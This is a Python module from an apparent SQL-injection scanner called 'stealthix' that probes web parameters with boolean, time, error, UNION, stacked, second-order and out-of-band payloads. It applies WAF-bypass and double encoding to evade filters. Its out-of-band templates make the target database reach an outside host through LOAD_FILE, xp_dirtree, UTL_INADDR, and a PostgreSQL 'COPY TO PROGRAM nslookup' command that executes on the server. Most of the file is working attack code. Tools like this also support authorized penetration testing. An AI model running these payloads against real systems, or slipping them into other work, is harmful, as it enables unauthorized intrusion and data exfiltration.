from __future__ import annotations

import logging
import os
import secrets
import statistics
from typing import Any
from urllib.parse import quote

import structlog

from stealthix.core.errors import DetectionError, NetworkError
from stealthix.core.http import make_request
from stealthix.core.models import Finding, TargetParam
from stealthix.core.session import ScanSession
from stealthix.core.targeting import (
    InjectionPoint,
    apply_payload,
    discover_injection_points,
    record_tested_param,
)
from stealthix.detection.rest_api import method_uses_body
from stealthix.utils import load_rust_core, resolve_payloads
from stealthix.utils.bypass import apply_waf_bypass

logger = structlog.get_logger(__name__)


def _encode_payload(payload: str) -> str:
    rust = load_rust_core()
    encoder_cls = rust.get("PayloadEncoder")
    if encoder_cls:
        encoder = encoder_cls()
        return encoder.double_url_encode(payload)
    return quote(quote(payload, safe=""), safe="")


def _prepare_payload(session: ScanSession, payload: str) -> str:
    return apply_waf_bypass(session, payload)


def _make_request(
    session: ScanSession,
    url: str,
    data: dict[str, Any] | None = None,
    method: str | None = None,
    use_cache: bool = True,
) -> tuple[str, float]:
    return make_request(session, url, data, method, use_cache=use_cache)


def _points(session: ScanSession, param: TargetParam | None = None) -> list[InjectionPoint]:
    if param:
        return [InjectionPoint(name=param.name, location=param.location)]
    points = discover_injection_points(session)
    if points:
        return points
    if method_uses_body(session.config.method):
        loc = "json" if session.config.body_format == "json" else "form"
    else:
        loc = "query"
    return [InjectionPoint(name="id", location=loc)]


def _error_signatures(session: ScanSession | None = None) -> list[str]:
    signatures = [
        "mysql",
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "sqlstate",
        "postgres",
        "syntax error",
        "ora-",
        "oracle",
        "odbc",
        "jdbc",
        "microsoft sql server",
        "sqlite",
        "sql error",
    ]
    if session:
        plugin = session.metadata.get("plugin") or {}
        extra = plugin.get("error_signatures") or []
        for item in extra:
            if isinstance(item, str) and item.strip():
                signatures.append(item.strip())
    deduped: list[str] = []
    seen: set[str] = set()
    for sig in signatures:
        if sig not in seen:
            seen.add(sig)
            deduped.append(sig)
    return deduped


def _match_errors(body: str, session: ScanSession | None = None) -> list[str]:
    rust = load_rust_core()
    matcher_cls = rust.get("ErrorMatcher")
    if matcher_cls:
        matcher = matcher_cls()
        try:
            return matcher.match_error(body)
        except (AttributeError, TypeError, ValueError) as e:
            logger.debug(f"Rust error matcher failed: {e}")
            return []
        except DetectionError as e:
            logger.warning(f"Unexpected error in Rust error matcher: {e}", exc_info=True)
            return []
    lower = body.lower()
    return [sig for sig in _error_signatures(session) if sig.lower() in lower]


def _custom_payloads(session: ScanSession, key: str) -> list[str] | None:
    custom = session.config.custom_payloads
    if not isinstance(custom, dict):
        return None
    payloads = custom.get(key)
    if isinstance(payloads, list):
        return [str(item) for item in payloads if str(item or "").strip()]
    return None


def load_payloads(kind: str, **kwargs: Any) -> list[str]:
    return resolve_payloads(kind, **kwargs)


def _payloads_for(session: ScanSession, family: str) -> list[str]:
    custom = _custom_payloads(session, family)
    try:
        return load_payloads(
            family,
            custom_payloads=custom,
            expand=True,
            risk=session.config.risk,
        )
    except TypeError:
        return load_payloads(family)


def _baseline_timings(
    session: ScanSession,
    url: str,
    data: dict[str, Any] | None = None,
    samples: int = 3,
) -> tuple[float, float]:
    timings = []
    for _ in range(samples):
        if data is not None and method_uses_body(session.config.method):
            _, elapsed = _make_request(session, url, data, "POST", use_cache=False)
        else:
            _, elapsed = _make_request(session, url, use_cache=False)
        timings.append(elapsed)
    mean = statistics.mean(timings)
    stdev = statistics.pstdev(timings) if len(timings) > 1 else 0.0
    return mean, stdev


def _boolean_based(session: ScanSession, point: InjectionPoint) -> list[Finding]:
    true_payload = _prepare_payload(session, "1 AND 1=1")
    false_payload = _prepare_payload(session, "1 AND 1=2")
    if method_uses_body(session.config.method):
        true_target, true_data = apply_payload(session, point, true_payload)
        false_target, false_data = apply_payload(session, point, false_payload)
        true_body, _ = _make_request(session, true_target, true_data, "POST")
        false_body, _ = _make_request(session, false_target, false_data, "POST")
        target = true_target
    else:
        true_target, _ = apply_payload(session, point, _encode_payload(true_payload))
        false_target, _ = apply_payload(session, point, _encode_payload(false_payload))
        true_body, _ = _make_request(session, true_target)
        false_body, _ = _make_request(session, false_target)
        target = true_target
    rust = load_rust_core()
    diff_cls = rust.get("DiffAnalyzer")
    if diff_cls:
        analyzer = diff_cls()
        diff = analyzer.length_diff(true_body, false_body)
        ratio = analyzer.ratio_diff(true_body, false_body)
    else:
        diff = abs(len(true_body) - len(false_body))
        ratio = diff / max(len(true_body), len(false_body), 1)
    ratio_threshold = 0.05 if session.config.level >= 3 else 0.1
    len_threshold = 40 if session.config.level >= 2 else 70
    if diff >= len_threshold and ratio >= ratio_threshold:
        return [
            Finding(
                kind="sqli-boolean",
                target=target,
                details={
                    "parameter": point.name,
                    "location": point.location,
                    "difference": diff,
                    "ratio": ratio,
                    "true_length": len(true_body),
                    "false_length": len(false_body),
                },
                parameter=point.name,
                location=point.location,
            )
        ]
    return []


def _time_based(session: ScanSession, point: InjectionPoint) -> list[Finding]:
    payloads = _payloads_for(session, "time_based")
    base_target, base_data = apply_payload(session, point, "1")
    mean, stdev = _baseline_timings(session, base_target, base_data)
    rust = load_rust_core()
    timing_cls = rust.get("TimingAnalyzer")
    analyzer = timing_cls() if timing_cls else None
    findings: list[Finding] = []
    for payload in payloads:
        prepared = _prepare_payload(session, payload)
        if method_uses_body(session.config.method):
            target, data = apply_payload(session, point, prepared)
            body, elapsed = _make_request(session, target, data, "POST", use_cache=False)
        else:
            target, _ = apply_payload(session, point, _encode_payload(prepared))
            body, elapsed = _make_request(session, target, use_cache=False)
        threshold = mean + max(0.8, 3 * stdev)
        is_outlier = analyzer.is_outlier(elapsed, mean, stdev) if analyzer else elapsed >= threshold
        if is_outlier:
            findings.append(
                Finding(
                    kind="sqli-time",
                    target=target,
                    details={
                        "parameter": point.name,
                        "location": point.location,
                        "payload": payload,
                        "elapsed": elapsed,
                        "baseline": mean,
                    },
                    parameter=point.name,
                    location=point.location,
                )
            )
    return findings


def _error_based(session: ScanSession, point: InjectionPoint) -> list[Finding]:
    payloads = _payloads_for(session, "error_based")
    findings: list[Finding] = []
    for payload in payloads:
        prepared = _prepare_payload(session, payload)
        if method_uses_body(session.config.method):
            target, data = apply_payload(session, point, prepared)
            body, elapsed = _make_request(session, target, data, "POST")
        else:
            target, _ = apply_payload(session, point, _encode_payload(prepared))
            body, elapsed = _make_request(session, target)
        matched = _match_errors(body, session)
        if matched:
            findings.append(
                Finding(
                    kind="sqli-error",
                    target=target,
                    details={
                        "parameter": point.name,
                        "location": point.location,
                        "payload": payload,
                        "elapsed": elapsed,
                        "errors": matched,
                    },
                    parameter=point.name,
                    location=point.location,
                )
            )
    return findings


def _union_based(session: ScanSession, point: InjectionPoint) -> list[Finding]:
    rust = load_rust_core()
    diff_cls = rust.get("DiffAnalyzer")
    findings: list[Finding] = []
    max_cols = min(12, 2 + session.config.level * 3)
    marker = "stealthix_marker"
    baseline_target, baseline_data = apply_payload(session, point, "1")
    baseline_body, _ = _make_request(
        session,
        baseline_target,
        baseline_data,
        "POST" if method_uses_body(session.config.method) else None,
    )
    order_by_limit = 0
    for idx in range(1, max_cols + 1):
        order_payload = _prepare_payload(session, f"' ORDER BY {idx}--")
        if method_uses_body(session.config.method):
            target, data = apply_payload(session, point, order_payload)
            body, _ = _make_request(session, target, data, "POST")
        else:
            target, _ = apply_payload(session, point, _encode_payload(order_payload))
            body, _ = _make_request(session, target)
        if _match_errors(body, session):
            order_by_limit = max(1, idx - 1)
            break
    column_attempts = range(1, (order_by_limit or max_cols) + 1)
    for cols in column_attempts:
        columns = ["NULL"] * cols
        columns[0] = f"'{marker}'"
        payload = _prepare_payload(session, f"' UNION SELECT {','.join(columns)}--")
        if method_uses_body(session.config.method):
            target, data = apply_payload(session, point, payload)
            body, elapsed = _make_request(session, target, data, "POST")
        else:
            target, _ = apply_payload(session, point, _encode_payload(payload))
            body, elapsed = _make_request(session, target)
        ratio = 0.0
        if diff_cls:
            analyzer = diff_cls()
            ratio = analyzer.ratio_diff(body, baseline_body)
        else:
            ratio = abs(len(body) - len(baseline_body)) / max(len(baseline_body), 1)
        if marker in body or ratio > 0.2:
            findings.append(
                Finding(
                    kind="sqli-union",
                    target=target,
                    details={
                        "parameter": point.name,
                        "location": point.location,
                        "columns": cols,
                        "payload": payload,
                        "elapsed": elapsed,
                        "ratio": ratio,
                    },
                    parameter=point.name,
                    location=point.location,
                )
            )
            break
    for payload in _payloads_for(session, "union_based"):
        prepared = _prepare_payload(session, payload)
        if method_uses_body(session.config.method):
            target, data = apply_payload(session, point, prepared)
            body, elapsed = _make_request(session, target, data, "POST")
        else:
            target, _ = apply_payload(session, point, _encode_payload(prepared))
            body, elapsed = _make_request(session, target)
        if marker in body or "stealthix" in body.lower():
            findings.append(
                Finding(
                    kind="sqli-union",
                    target=target,
                    details={
                        "parameter": point.name,
                        "location": point.location,
                        "payload": prepared,
                        "elapsed": elapsed,
                    },
                    parameter=point.name,
                    location=point.location,
                )
            )
    return findings


def _stacked(session: ScanSession, point: InjectionPoint) -> list[Finding]:
    payloads = _payloads_for(session, "stacked")
    base_target, base_data = apply_payload(session, point, "1")
    mean, stdev = _baseline_timings(session, base_target, base_data)
    findings: list[Finding] = []
    for payload in payloads:
        prepared = _prepare_payload(session, payload)
        if method_uses_body(session.config.method):
            target, data = apply_payload(session, point, prepared)
            body, elapsed = _make_request(session, target, data, "POST", use_cache=False)
        else:
            target, _ = apply_payload(session, point, _encode_payload(prepared))
            body, elapsed = _make_request(session, target, use_cache=False)
        if elapsed >= mean + max(1.5, 4 * stdev) or _match_errors(body, session):
            findings.append(
                Finding(
                    kind="sqli-stacked",
                    target=target,
                    details={
                        "parameter": point.name,
                        "location": point.location,
                        "payload": prepared,
                        "elapsed": elapsed,
                    },
                    parameter=point.name,
                    location=point.location,
                )
            )
    return findings


def _second_order(session: ScanSession, point: InjectionPoint) -> list[Finding]:
    token = f"stealthix_second_{secrets.token_hex(6)}"
    payload = _prepare_payload(session, token)
    if method_uses_body(session.config.method):
        target, data = apply_payload(session, point, payload)
        _make_request(session, target, data, "POST", use_cache=False)
        follow_body, _ = _make_request(session, session.config.base_url, use_cache=False)
        target_used = target
    else:
        target, _ = apply_payload(session, point, _encode_payload(payload))
        _make_request(session, target, use_cache=False)
        follow_body, _ = _make_request(session, session.config.base_url, use_cache=False)
        target_used = target
    if token in follow_body:
        return [
            Finding(
                kind="sqli-second-order",
                target=target_used,
                details={
                    "parameter": point.name,
                    "location": point.location,
                    "token": token,
                    "evidence": "token_in_followup",
                },
                parameter=point.name,
                location=point.location,
            )
        ]
    return []


def _oob_payload_templates(session: ScanSession) -> list[dict[str, str]]:
    plugin = session.metadata.get("plugin")
    plugin_name = plugin.get("name") if isinstance(plugin, dict) else ""
    dbms = str(session.config.dbms or plugin_name or "").lower()
    templates = {
        "mysql": [
            {"strategy": "dns-load-file", "template": "' UNION SELECT LOAD_FILE('\\\\{host}\\a')--"}
        ],
        "mariadb": [
            {"strategy": "dns-load-file", "template": "' UNION SELECT LOAD_FILE('\\\\{host}\\a')--"}
        ],
        "tidb": [
            {"strategy": "dns-load-file", "template": "' UNION SELECT LOAD_FILE('\\\\{host}\\a')--"}
        ],
        "mssql": [
            {
                "strategy": "dns-xp-dirtree",
                "template": "'; exec master..xp_dirtree '\\\\{host}\\share'--",
            }
        ],
        "oracle": [
            {
                "strategy": "dns-utl-inaddr",
                "template": "' UNION SELECT UTL_INADDR.get_host_address('{host}') FROM dual--",
            }
        ],
        "postgresql": [
            {
                "strategy": "dns-copy-program",
                "template": "'; COPY (SELECT '{token}') TO PROGRAM 'nslookup {host}';--",
            }
        ],
        "cockroachdb": [
            {
                "strategy": "dns-copy-program",
                "template": "'; COPY (SELECT '{token}') TO PROGRAM 'nslookup {host}';--",
            }
        ],
        "yugabytedb": [
            {
                "strategy": "dns-copy-program",
                "template": "'; COPY (SELECT '{token}') TO PROGRAM 'nslookup {host}';--",
            }
        ],
    }
    if dbms and dbms in templates:
        return templates[dbms]
    combined: list[dict[str, str]] = []
    for name in ["mysql", "mssql", "oracle", "postgresql"]:
        combined.extend(templates[name])
    return combined


def _oob_based(session: ScanSession, param: TargetParam | None = None) -> list[Finding]:
    from stealthix.oob.providers import provider_from_env

    provider = provider_from_env()
    if provider is None:
        return []
    domain = provider.domain
    rust = load_rust_core()
    exfil_cls = rust.get("DnsExfil")
    base_token = f"stealthix{secrets.token_hex(4)}"
    exfil = exfil_cls() if exfil_cls else None
    payload_templates = _oob_payload_templates(session)
    strategy_filter = {
        item.strip().lower()
        for item in (os.environ.get("STEALTHIX_OOB_STRATEGY") or "auto").split(",")
        if item.strip()
    }
    if strategy_filter and "auto" not in strategy_filter:
        payload_templates = [
            item for item in payload_templates if item["strategy"].lower() in strategy_filter
        ]
    if not payload_templates:
        return []
    tokens = [f"{base_token}{i}" for i in range(1, len(payload_templates) + 1)]
    hosts: dict[str, str] = {}
    for t in tokens:
        label = exfil.encode_subdomain(t) if exfil else t
        hosts[t] = provider.host_for_token(label)
    _legacy_payload_templates = [
        "' UNION SELECT LOAD_FILE('\\\\\\\\{host}\\\\a')--",
        "'; exec master..xp_dirtree '\\\\\\\\{host}\\\\share'--",
        "' UNION SELECT UTL_INADDR.get_host_address('{host}') FROM dual--",
    ]
    attempts: list[dict[str, Any]] = []
    for point in _points(session, param):
        for token, template in zip(tokens, payload_templates, strict=False):
            host = hosts[token]
            payload = template["template"].format(host=host, token=token)
            prepared = _prepare_payload(session, payload)
            if method_uses_body(session.config.method):
                target, data = apply_payload(session, point, prepared)
                body, elapsed = _make_request(session, target, data, "POST")
            else:
                target, _ = apply_payload(session, point, _encode_payload(prepared))
                body, elapsed = _make_request(session, target)
            evidence = host.lower() in body.lower() or bool(_match_errors(body, session))
            attempts.append(
                {
                    "target": target,
                    "parameter": point.name,
                    "location": point.location,
                    "payload": prepared,
                    "elapsed": elapsed,
                    "evidence": evidence,
                    "token": token,
                    "host": host,
                    "strategy": template["strategy"],
                }
            )

    timeout = float(os.environ.get("STEALTHIX_OOB_TIMEOUT", "5"))
    confirmation = provider.wait_for_tokens(tokens, timeout=timeout)
    return [
        Finding(
            kind="sqli-oob",
            target=session.config.base_url,
            details={
                "domain": domain,
                "provider": confirmation.provider,
                "tokens": tokens,
                "hosts": hosts,
                "confirmed": confirmation.confirmed,
                "attempts": attempts,
                "strategies": [item["strategy"] for item in payload_templates],
                "query_log": [item.to_dict() for item in confirmation.interactions],
            },
        )
    ]


def detect_sqli(session: ScanSession, param: TargetParam | None = None) -> list[Finding]:
    findings: list[Finding] = []
    base_payloads = _payloads_for(session, "sqli")
    for point in _points(session, param):
        record_tested_param(session, module="sqli", point=point)
        for payload in base_payloads:
            prepared = _prepare_payload(session, payload)
            if method_uses_body(session.config.method):
                target, data = apply_payload(session, point, prepared)
                body, elapsed = _make_request(session, target, data, "POST", use_cache=False)
            else:
                target, _ = apply_payload(session, point, _encode_payload(prepared))
                body, elapsed = _make_request(session, target, use_cache=False)
            matched = _match_errors(body, session)
            if matched:
                findings.append(
                    Finding(
                        kind="sqli",
                        target=target,
                        details={
                            "parameter": point.name,
                            "location": point.location,
                            "payload": prepared,
                            "elapsed": elapsed,
                            "errors": matched,
                            "signals": ["sql-error-signature"],
                        },
                        parameter=point.name,
                        location=point.location,
                    )
                )
    technique = (session.config.technique or "").upper()
    for point in _points(session, param):
        record_tested_param(session, module="sqli-techniques", point=point)
        if not technique or "B" in technique:
            findings.extend(_boolean_based(session, point))
        if not technique or "T" in technique:
            findings.extend(_time_based(session, point))
        if not technique or "E" in technique:
            findings.extend(_error_based(session, point))
        if not technique or "U" in technique:
            findings.extend(_union_based(session, point))
        if not technique or "S" in technique:
            findings.extend(_stacked(session, point))
        if session.config.level >= 5:
            findings.extend(_second_order(session, point))
    if session.config.level >= 4:
        findings.extend(_oob_based(session, param))
    return findings
